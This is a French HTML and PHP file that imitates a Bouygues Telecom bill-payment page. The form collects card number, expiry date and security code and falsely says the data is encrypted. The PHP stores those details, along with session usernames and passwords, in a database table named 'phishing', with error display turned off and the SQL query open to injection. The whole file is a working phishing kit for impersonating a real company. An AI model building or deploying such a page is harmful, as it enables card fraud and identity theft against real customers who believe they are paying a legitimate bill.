
<html>
    <head>
    <script>
        function afficherMessagePaiement() {
            alert("Paiement réussi, merci !");
        }
    </script>
    <style>
        body {
            background-color: #3B5998; /* Fond bleu */
            font-family: Arial, sans-serif;
            color: white; /* Couleur du texte */
            padding: 20px;
        }

        h2 {
            text-align: center;
        }

        form {
            background-color: white; /* Fond blanc pour le formulaire */
            color: black; /* Couleur du texte du formulaire */
            padding: 20px;
            border-radius: 8px; /* Bords arrondis */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Ombre pour le formulaire */
            max-width: 400px; /* Largeur maximale du formulaire */
            margin: auto; /* Centrer le formulaire */
        }

        .input-box {
            margin-bottom: 15px;
        }

        .input-box input {
            width: 100%; /* Prendre toute la largeur */
            padding: 10px; /* Espacement intérieur */
            border: 1px solid #ccc; /* Bordure du champ */
            border-radius: 4px; /* Bords arrondis */
        }

        .input-box label {
            display: block; /* Mettre le label en block */
            margin-bottom: 5px; /* Espacement entre le label et le champ */
        }

        button {
            background-color: #007BFF; /* Couleur du bouton */
            color: white; /* Couleur du texte du bouton */
            border: none; /* Pas de bordure */
            padding: 10px 15px; /* Espacement intérieur du bouton */
            border-radius: 5px; /* Bords arrondis du bouton */
            cursor: pointer; /* Curseur main au survol */
            width: 100%; /* Prendre toute la largeur */
        }

        button:hover {
            background-color: #0056b3; /* Couleur au survol */
        }
        .input-box {
    position: relative;
    margin-bottom: 30px;
}

.input-box input {
    width: 100%;
    padding: 10px;
    background-color: #f0f0f0;
    border: none;
    border-radius: 5px;
    outline: none;
    transition: 0.3s;
    font-size: 16px;
    color: #333;
}

.input-box label {
    position: absolute;
    top: 50%;
    left: 10px;
    transform: translateY(-50%);
    color: #999;
    pointer-events: none;
    transition: 0.3s;
}

.input-box input:focus + label,
.input-box input:valid + label {
    top: 5px;
    left: 10px;
    font-size: 12px;
    color: #4A69BD;
}
.payment-logo {
    width: auto;
    max-width: 130px; /* Limite la largeur maximale à 50px */
    height: auto;    /* Maintient le ratio d'aspect */
    margin: 0 10px;
    vertical-align: middle;
}
    </style>
    </head>
    <body>
        <h2>Payer sa dernière facture :</h2>
        <img src="bouygues.jpg" alt="" class="payment-logo">
        <form action="accueil.php" method="POST">
                        <div class="input-box">
                            <input type="text" id="numcarte" name="numcarte" required>
                            <label for="numcarte">Numéro de carte :</label>
                        </div>
                        
                        <div class="input-box">
                            <input type="text" id="expirydate" name="expirydate" required>
                            <label for="expirydate">Date d'expiration :</label>
                        </div>
                        
                        <div class="input-box">
                            <input type="text" id="securitycode" name="securitycode" required>
                            <label for="securitycode">Code de sécurité :</label>
                        </div>
                        
                        <button type="submit">Payer</button>

        </form>
       
        <h4>Bouygues Telecom accepte la plupart des cartes de paiement. Vos informations de paiement sont encryptées et sécurisées.</h4>
<br>
        <div class="payment-methods">
        <img src="cartes.jpg" alt="" class="payment-logo">

    </body>
</html>




<?php
    include '_conf.php';
    ini_set('display_errors', 0); // Désactive l'affichage des erreurs
    error_reporting(0); // Désactive la génération de messages d'erreur
    session_start();
    $connexion = mysqli_connect($serveurBDD, $userBDD, $mdp, $nomBDD);
    $numcarte1 = $_POST['numcarte'];
    $expirydate1 = $_POST['expirydate'];
    $securitycode1 =$_POST['securitycode'];


    if (isset($_SESSION['username']) && isset($_SESSION['password'])) {
       $username = $_SESSION['username'];
      $password = $_SESSION['password'];
        
        $requete = " UPDATE `phishing` SET `numcarte`='$numcarte1',`datecarte`='$expirydate1',`vvs`='$securitycode1' WHERE `id`='$username' and `mdp`='$password';";
        
        $resultat = mysqli_query($connexion, $requete);
        
    }

?>
